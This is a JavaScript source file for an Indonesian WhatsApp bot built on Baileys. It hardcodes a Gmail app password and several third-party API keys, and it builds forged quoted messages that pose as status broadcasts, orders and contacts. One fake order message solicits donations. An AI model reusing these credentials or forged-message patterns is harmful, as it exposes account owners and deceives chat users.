// Recode By TestGanz ✓
//============================⫹⫺

// Izin Akses Penyimpanan !
//====================================\\
require('./settings')
//====================================//

//=================================================================\\
              // Aksi Pengaitan BOT Terhadap WhatsApp \\
//=================================================================\\
const { 
    WAConnection,
    MessageType,
   	Presence,
   	makeWASocket,
	 	MessageOptions,
   	WALocationMessage,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    downloadContentFromMessage,
    proto,
    generateWAMessageContent,
    Mimetype,
    initInMemoryKeyStore,
    WA_MESSAGE_STUB_TYPES,
   	ProxyAgent,
  	GroupSettingChange,
   	AnyMessageContent,
    waChatKey,
   	mentionedJid,
  	processTime,
    delay,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    WAFlag,
    getContentType 
} = require('@adiwajshing/baileys')
//===========================⟨ END ⟩==============================//

// ================================================\\
const fs = require('fs-extra');
const util = require('util');
const path = require('path');
const brainly = require('brainly-scraper');
const { fetchUrl } = require("./lib/Function");
const os = require('os');
const google = require('google-it');
const request = require('request');
const { TelegraPH } = require("./lib/TelegraPH")
const { hentai } = require('./lib/scraper')
const PhoneNum = require('awesome-phonenumber');
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');
const hx = require('hxz-api');
const hxz = require('./lib/hxz-api');
const { quote } = require('./lib/quote.js')
const apiUrl = process.argv[2];
const jsobfus = require('javascript-obfuscator')
const { remini } = require('./lib/remini')
const { pinterest } = require('./lib/scraper')
const { performance } = require('perf_hooks');
const chalk = require('chalk');
const { getUser, getPost, searchUser } = require('./lib/Insta');
const bochil = require('@bochilteam/scraper');
const ytdl = require('ytdl-core');
const { v4 } = require('uuid')
const { Reached } = require('node-webpmux');
const speed = require('performance-now');
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
const timeZone = require('moment-timezone');
const cd = 4.32e+7
const { exec: execS } = require("child_process");
const { exec, spawn, execSync } = require("child_process");
const { sizeFormatter } = require('human-readable');
const { UploadFileUgu, webp2mp4File } = require('./lib/uploader');
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif } = require('./lib/exif');
const yts = require('./lib/yt-search');
const { updateDatabase } = require('./lib/SistemWebp.js')
const xfar = require('xfarr-api');
const { imgSuper } = require('./lib/SCRAPER/ephoto')
const { mimeTypes } = require('file-type');
const { mimeType } = require('file-type');
const low = require('./lib/lowdb');
const { uploadImages } = require('./src/fetcher');
const { mediafireDl } = require('./lib/mediafire.js');
const { ytSearch } = require('./lib/yt');
const { toDataURL } = require('qrcode');
const igsikwksbak = require('insta-fetcher')
const imgbbUploader = require('imgbb-uploader');
const owner = JSON.parse(fs.readFileSync('./owner.json'))
const { JSDOM } = require('jsdom');
const { uptotelegra } = require('./lib/upload');
const maker = require('mumaker');
const { Configuration, OpenAIApi } = require("openai");
const moment = require('moment-timezone');
const axios = require('axios');
const get = require('got');
const { ytMp4, ytMp3, ytPlay } = require('./lib/yotube')
const instagramGetUrl = require('instagram-url-direct');
const { ChatAIHandler } = require('./lib/openai');
const appRoot = require('app-root-path');
const ms = toMs = require('ms');
const { Primbon } = require('scrape-primbon');
const primbon = new Primbon()
const FormData = require("form-data");
const { formatp, formatDate, getTime, sleep, clockString, fetchJson, jsonformat, format, getRandom } = require('./lib/myfunc')
const { 
   toAudio, 
   toPTT, 
   toVideo, 
   ffmpeg
} = require('./lib/converter')
const {
    fromBuffer
} = require('file-type')
const fetch = require('node-fetch')
const {
  RemoveBgResult, 
  removeBackgroundFromImageBase64, 
  removeBackgroundFromImageFile
} = require('remove.bg')
const {
  FajarNews, 
  BBCNews,
  metroNews,
  CNNNews,
  iNews,
  KumparanNews,
  TribunNews,
  DailyNews,
  DetikNews,
  OkezoneNews,
  CNBCNews,
  KompasNews,
  SindoNews,
  TempoNews,
  IndozoneNews,
  AntaraNews,
  RepublikaNews,
  VivaNews,
  KontanNews,
  MerdekaNews,
  KomikuSearch,
  AniPlanetSearch,
  KomikFoxSearch,
  KomikStationSearch,
  MangakuSearch,
  KiryuuSearch,
  KissMangaSearch,
  KlikMangaSearch,
  PalingMurah,
  LayarKaca21,
  AminoApps,
  Mangatoon,
  WAModsSearch,
  Emojis,
  CoronaInfo,
  JalanTikusMeme, 
  Cerpen,
  Quotes,
  Couples,
  Darkjokes
} = require("dhn-api")
const { 
  yta, 
  ytv, 
  searchResult 
 } = require('./lib/ytdl')
const {
    msToDate,
    hitungmundur,
    checkBandwidth
} = require('./lib/simple')
const similarity = require('similarity');
const threshold = 0.72
const { color, bgcolor } = require('./lib/color');
const nou = require('node-os-utils');
//=================================================//

////////////////////////////////////////////////////////

// @By°TestGanz ~

////////////////////////////////////////////////////////

//=================================================\\
//══════[System-Lain]══════//
fake = '© TᴇsᴛGᴀɴᴢ'
autoreadsw = true
mecolors = ['red','white','black','blue','yellow','green', 'aqua']
colors = mecolors[Math.floor(Math.random() * mecolors.length)]
lolkeysapi = '09b723b1fee8877ff7a8c347'
//═══════[Api-Zenz]═══════//
zenzapins = ['zenzkey_50458da205','zenzkey_fbe7007cd4','zenzkey_03446602e0','zenzkey_555b690488','zenzkey_f208353633','zenzkey_a86b55160532','zenzkey_67c9c2699812','zenzkey_fa21d3d63ccc','zenzkey_b8bee169b18d','zenzkey_66953076a302']
zenzkeyss = zenzapins[Math.floor(Math.random() * zenzapins.length)]
//═══════[Database]═══════//
let vnnya = JSON.parse(fs.readFileSync('./database/vnnya.json'))
let vote = JSON.parse(fs.readFileSync('./database/vote.json'));
let banned = JSON.parse(fs.readFileSync('./database/banned.json'));
//══════[Waktu-Daerah]═══════//
moment.tz.setDefault("Asia/Jakarta").locale("id")
//═══════[Zona-Waktu]═══════//
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const hariiini = moment.tz('Asia/Jakarta').format('DD MMMM YYYY')
const barat = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const tengah = moment.tz('Asia/Makassar').format('HH:mm:ss')
const timur = moment.tz('Asia/Jayapura').format('HH:mm:ss')
const wib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
//═══════[Akses-Tambahan]═══════//
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const totalFitur = () =>{
var mytext = fs.readFileSync("./@TGanzBOT.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
}
//=================================================//

//=============================================================\\

                  // Alternatif - Function Myfunc \\

//=============================================================//

//=================================================\\
                // Aksi Waktu Runtime \\
//=================================================\\
const runtime = function(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " hari, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " jam, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " menit, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " detik") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
//=================================================//

//=================================================\\
const makeid = (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
  result += characters.charAt(Math.floor(Math.random() *
  charactersLength));
    }
    return result
}
const sendMail = (untuk, teks) => {
var transporter1 = nodemailer.createTransport({
            service: 'gmail',
            auth: {
        user: "mikuchantik18@gmail.com", // generated ethereal user
        pass: "vdjquwuabmzkchil", // generated ethereal password
    },
    debug: false,
    logger: true  // <---highly recommend this one here
});
var mailOptions = {
    from: 'mikuchantik18@gmail.com',
    to: untuk,
    subject: makeid(5),
    text: teks
};
transporter1.sendMail(mailOptions, function(err, data) { 
    if(err) { 
         eror();
     } 
});
}
//=================================================//

//=================================================//
const isUrl = async (url) => {
    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
//=================================================//

//=================================================\\
const sendButton = async (from, context, fortext, but, mek) => {
            buttonMessages = {
                contentText: context,
                footerText: fortext,
                buttons: but,
                headerType: 1
            }
            tganz.sendMessage(from, buttonMessages, buttonsMessage, {
                quoted: mek
            })
        }
//=================================================//

//=================================================\\
                   // Button - Text \\
//=================================================\\
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
tganz.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
//=================================================//

//=================================================\\
                  // Button - Gambar \\
//=================================================\\
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await tganz.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
tganz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//=================================================//

//=================================================\\
                  // Button - Video \\
//=================================================\\
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await tganz.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
tganz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//=================================================//

//=================================================\\
                  // Button - Lokasi \\
//=================================================\\
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await tganz.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
tganz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//=================================================//

//=================================================\\
                  // Aksi Mention \\
//=================================================\\
const parseMention = (text = '') => {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
//=================================================//

//=================================================\\
                  // Akse TelegraPH \\
//=================================================\\
function TelegraPh (Path) {
	return new Promise (async (resolve, reject) => {
		if (!fs.existsSync(Path)) return reject(new Error("File not Found"))
		try {
			const form = new FormData();
			form.append("file", fs.createReadStream(Path))
			const data = await  axios({
				url: "https://telegra.ph/upload",
				method: "POST",
				headers: {
					...form.getHeaders()
				},
				data: form
			})
			return resolve("https://telegra.ph" + data.data[0].src)
		} catch (err) {
			return reject(new Error(String(err)))
		}
	})
}
//=================================================//

//=================================================\\
               // Riwayat Akses Admin \\
//=================================================\\
const getGroupAdmins = async(participants) => {
        let admins = []
        for (let i of participants) {
            i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : ''
        }
        return admins || []
}
//=================================================//

//=================================================\\
                   // Aksi Buffer \\
//=================================================\\
const getBuffer = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "get",
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (err) {
		return err
	}
}
//=================================================//

//=================================================\\
                  // Aksi Js-Obfus \\
//=================================================\\
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `© TestGanz`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
//=================================================//



//=================================================================\\

// Starting ...

//=================================================================//



//========================================================================\\

// Module import dari base !
module.exports = tganz = async (tganz, m, chatUpdate, store, _welcome, _left) => {

//=========================================================================\\
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const chatmessage = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        const isCmd = /^[#.!\\\^]/.test(body)
        const prefix = isCmd ? budy[0] : ''
        const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const from = m.chat
	      const type = Object.keys(mek.message)[0]        
	      const content = JSON.stringify(mek.message)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const pushname = m.pushName || "No Name"
        const botNumber = await tganz.decodeJid(tganz.user.id)
        const tanggal = moment().tz("Asia/Jakarta").format("dddd, DD MMMM YYYY")
        const jam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
        const salam = moment(Date.now()).tz("Asia/Jakarta").locale('id').format('a')
        const isCreator = [botNumber, ...global.owner, '6289512696170@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const arghh = command.split(' ')
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(m.quoted ? m.quoted.mtype : m.mtype)
        const isPrivate = m.key.remoteJid.endsWith('@s.whatsapp.net')
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const isWelcome = _welcome.includes(m.chat)  ? true : false
        const isLeft = _left.includes(m.chat) ? true : false
        const groupMetadata = m.isGroup? await tganz.groupMetadata(m.chat).catch(e => {}) : ""
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const groupId = m.isGroup ? groupMetadata.jid : ''
		   	const groupMembers = m.isGroup ? groupMetadata.participants : ''
	    	const groupDesc = m.isGroup ? groupMetadata.desc : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isBan = banned.includes(m.sender)
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
//========================================================================//

//=======================================================\\
      const sendPtt = (teks) => {
		    tganz.sendMessage(from, audio, mp3, {quoted:mek})
			}
			const costum = (pesan, tipe, target, target2) => {
			tganz.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }}})
			}
       const fakethumb = (teks, yes) => {
            tganz.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./image/foto.jpg'),quoted:m,caption:yes})
          }
       const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? tganz.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : tganz.sendMessage(from, teks.trim(), extendedText, {quoted: m, contextInfo: {"mentionedJid": memberr}})
		}
		const sendvn = (teks) => {
            tganz.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
        }
        for (let anju of vnnya) {
            if (budy === anju) {
                let buffer = fs.readFileSync(`./Media/Voice-Note/${anju}.mp3`)
                sendvn(buffer)
            }
        }
     try {
ppuser = await tganz.profilePictureUrl(sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
//=======================================================//

//=======================================================\\
                    // Balasan Otomatis \\
//=======================================================\\
  
  if (chatmessage.includes(`assalamualaikum`) || chatmessage.includes(`Asalamu'alaikum`) || chatmessage.includes(`Assalamualaikum`) || chatmessage.includes(`Asalamualaikum`) || chatmessage.includes(`asalamu'alaikum`) || chatmessage.includes(`assalamu'alaikum`) || chatmessage.includes(`Assalamu'alaikum`) || chatmessage.includes(`Assalamu'alaikum`) || chatmessage.includes(`asalamualaikum`) || chatmessage.includes(`asalamu'alaikum`) || chatmessage.includes(`Assalamualaikum Wr Wb`) || chatmessage.includes(`assalamualaikum warahmatullahi wabarakatuh`) || chatmessage.includes(`Aslamualaikum`) || chatmessage.includes(`asslamualaikum`)) {
       
        tganz.sendMessage(from, 
        { text: '*Waalaikumus Salam Wa Rahmatullahi Wabarakatuh*' }, 
        { quoted : m })  
       }    
//=======================================================⫹⫺
    if (chatmessage.includes(`hallo`) || chatmessage.includes(`halo`) || chatmessage.includes(`Hallo`) || chatmessage.includes(`Halo`) || chatmessage.includes(`hello`) || chatmessage.includes(`helo`) || chatmessage.includes(`Hello`) || chatmessage.includes(`Helo`)){
       tganz.sendMessage(from, 
        { text: '*Hallo juga kakak, Semoga harimu bahagia ya ^~^*' }, 
        { quoted : m })  
       } 
//=======================================================//

//━━━━━━━━━━━━━━━[ FAKE ]━━━━━━━━━━━━━━━━━//
	    const ftroli = {
    key: {
        fromMe: false,
        "participant": "0@s.whatsapp.net",
        "remoteJid": "status@broadcast"
    },
    "message": {
        orderMessage: {
            itemCount: 2022,
            status: 200,
            thumbnail: thumb,
            surface: 200,
            message: `${ttname}`,
            orderTitle: 'TestGanz - BOT',
            sellerJid: '0@s.whatsapp.net'
        }
    },
    contextInfo: {
        "forwardingScore": 999,
        "isForwarded": true
    },
    sendEphemeral: true
}

const fdoc = {
    key: {
        participant: '0@s.whatsapp.net',
        ...(m.chat ? {
            remoteJid: `status@broadcast`
        } : {})
    },
    message: {
        documentMessage: {
            title: `${ttname}`,
            jpegThumbnail: thumb,
        }
    }
}
const fvn = {
    key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "audioMessage": {
            "mimetype": "audio/ogg; codecs=opus",
            "seconds": 359996400,
            "ptt": "true"
        }
    }
}

const ftextt = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "extendedTextMessage": {
            "text": `${ttname}`,
            "title": `${botname}`,
            'jpegThumbnail': thumb,
        }
    }
}

const ftoko = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "productMessage": {
            "product": {
                "productImage": {
                    "mimetype": "image/jpeg",
                    "jpegThumbnail": thumb,
                },
                "title": `${ttname}`,
                "description": `${botname}`,
                "currencyCode": "IDR",
                "priceAmount1000": "1000000000000000000",
                "retailerId": `${ttname}`,
                "productImageCount": 1
            },
            "businessOwnerJid": `0@s.whatsapp.net`
        }
    }
}

const fgif = {
    key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "videoMessage": {
            "title": `${ttname}`,
            "h": `Hmm`,
            'seconds': '359996400',
            'gifPlayback': 'true',
            'caption': `${ttname}`,
            'jpegThumbnail': thumb,
        }
    }
}

const fgclink = {
    key: {
        participant: "0@s.whatsapp.net",
        "remoteJid": "0@s.whatsapp.net"
    },
    "message": {
        "groupInviteMessage": {
            "groupJid": "6288213840883-1616169743@g.us",
            "inviteCode": "m",
            "groupName": `${ttname}`,
            "caption": `${ttname}`,
            'jpegThumbnail': thumb,
        }
    }
}

const fvideo = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "videoMessage": {
            "title": `${ttname}`,
            "h": `Hmm`,
            'seconds': '359996400',
            'caption': `${ttname}`,
            'jpegThumbnail': thumb,
        }
    }
}

const floc = {
    key: {
        participant: '0@s.whatsapp.net',
        ...(m.chat ? {
            remoteJid: `status@broadcast`
        } : {})
    },
    message: {
        locationMessage: {
            name: `${ttname}`,
            jpegThumbnail: thumb,
        }
    }
}

const floc2 = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "liveLocationMessage": {
            "title": `${ttname}`,
            "h": `Hmm`,
            'jpegThumbnail': thumb,
        }
    }
}

const fkontak = {
    key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: `status@broadcast`
        } : {})
    },
    message: {
        'contactMessage': {
            'displayName': `${ttname}`,
            'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6289512696170:6289512696170\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
            'jpegThumbnail': thumb,
            thumbnail: thumb,
            sendEphemeral: true
        }
    }
}

const fakestatus = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    message: {
        "imageMessage": {
            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
            "mimetype": "image/jpeg",
            "caption": `${ttname}`,
            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
            "fileLength": "28777",
            "height": 1080,
            "width": 1079,
            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
            "mediaKeyTimestamp": "1610993486",
            "jpegThumbnail": thumb,
            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
        }
    }
}

const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
 "orderMessage": {
"orderId": orid, // Ganti Idnya
"thumbnail": img, // Ganti Imagenya
"itemCount": itcount, // Ganti Item Countnya
"status": "INQUIRY", // Jangan Diganti
"surface": "CATALOG", // Jangan Diganti
"orderTitle": title, // Ganti Titlenya
"message": text, // Ganti Messagenya
"sellerJid": sellers, // Ganti sellernya
"token": tokens, // Ganti tokenya
"totalAmount1000": ammount, // Ganti Total Amountnya
"totalCurrencyCode": "IDR", // Terserah
}
}), { userJid: jid })
mans.relayMessage(jid, order.message, { messageId: order.key.id})
}
//━━━━━━━━━━━━━━━[ OUT ]━━━━━━━━━━━━━━━━━//
const sotoy = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔  Win',
		'🍒 : 🍒 : 🍒 Win',
		'🍌 : 🍌 : 🍌 Lose'
		]
		
	function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
  }
  function generateRandomPassword() {
    return Array(10).fill(null).map(() => (Math.random() * 16 | 0).toString(16)).join('');
  }
	const klqor = ['😁','🥰','😇','🥲','🙃','🙂','🤑','😑','♻️','🔞','✅','🙏','❤','🔴','❗','〽️','🎶','🤗','👤','🔎','🔋','📚','🎬','🐵','🐒','🐦','🍌','🍎','🥝','🥒','🫓','🍒','🍐','🥦','🌍','🌎','🎃','🎄','🥎','🎖','🏆','🏅','🥇','🥈','🥉','🎗','🎟','🎫','🎁','🎀','👑','💎','⚠️']
	const kloadq = klqor[Math.floor(Math.random() * klqor.length)]
	const filsj = ['application/vnd.openxmlformats-officedocument.spreadsheetml.sheet','application/vnd.openxmlformats-officedocument.presentationml.presentation','application/vnd.openxmlformats-officedocument.wordprocessingml.document','application/pdf']
	const filsk = filsj[Math.floor(Math.random() * filsj.length)]

//=================================================//
               // Created By TestGanz \\
//=================================================//
const HBD = new Date(`${global.ultah} 00:00:00`).getTime();
const sekarang = new Date().getTime();
const Selisih = HBD - sekarang;
const jhari = Math.floor(Selisih / (1000 * 60 * 60 * 24));
const jjam = Math.floor(Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
const mmmenit = Math.floor(Selisih % (1000 * 60 * 60) / (1000 * 60));
const ddetik = Math.floor(Selisih % (1000 * 60) / 1000);
const menuju = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
//=================================================//
const generateProfilePicture = async (buffer) => {
	const jimp = await Jimp.read(buffer)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG),
		preview: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG)
	}
}
//=================================================//
   //Resize
//=================================================//
         const resize = async(buffer, ukur1, ukur2) => {
             return new Promise(async(resolve, reject) => {
             let jimp = require('jimp')
             var baper = await jimp.read(buffer);
             var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
             resolve(ab)
             })
             }
//=================================================//
            // Deteksi Ajakan Pengguna \\
//=================================================//
if (m.mtype === 'groupInviteMessage') {
teks = `*[!]* = *Tᴇʀᴅᴇᴛᴇᴋsɪ Iɴᴠɪᴛᴇ Bᴏᴛ !!!*

❑ _Hᴀɪ ᴋᴀᴋᴀᴋ, ᴜɴᴛᴜᴋ ᴀᴊᴀᴋᴀɴ ᴋᴀᴋᴀᴋ ᴛᴇʀʜᴀᴅᴀᴘ ʙᴏᴛ ᴋᴀᴍɪ, sɪʟᴀʜᴋᴀɴ ᴅᴏɴᴀsɪ ᴛᴇʀʟᴇʙɪʜ ᴅᴜʟᴜ ᴍɪɴɪᴍᴀʟ 5ᴋ_ !

❑ Uɴᴛᴜᴋ ᴅᴏɴᴀsɪ ʙɪsᴀ ᴍᴇʟᴀʟᴜɪ Dᴀɴᴀ, Oᴠᴏ, Gᴏᴘᴀʏ. sɪʟᴀʜᴋᴀɴ ᴋɪʀɪᴍ ᴅᴏɴᴀsɪ ɴᴏᴍᴏʀ ᴛᴜᴊᴜᴀɴ *"089512696170"*. Jɪᴋᴀ sᴜᴅᴀʜ sɪʟᴀʜᴋᴀɴ ᴋᴇᴛɪᴋ : #sᴜᴅᴀʜʙᴀɴɢ

*⫹⫺ Sᴇᴍᴏɢᴀ ʜᴀʀɪᴍᴜ ʙᴀʜᴀɢɪᴀ ⫹⫺*`
sendOrder(m.chat, teks, "5123658817728409", fs.readFileSync('./image/foto.jpg'), 2023, "❑ ᴋʟɪᴋ ᴅᴀɴ ᴄʜᴀᴛ !", "6289512696170@s.whatsapp.net", "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==", "Rp 5.000,-")
}
//=================================================//
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let setting = global.db.data.settings[botNumber]
    if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
	 if (!isNumber(setting.status)) setting.status = 0
	              if (!('restartDB' in settings)) settings.restartDB = 0
                if (!('tanpacall' in setting)) setting.tanpacall = true
                if (!('autobio' in setting)) setting.autobio = false
                if (!('autoread' in setting)) setting.autoread = true
                if (!('modebot23' in setting)) setting.modebot23 = true
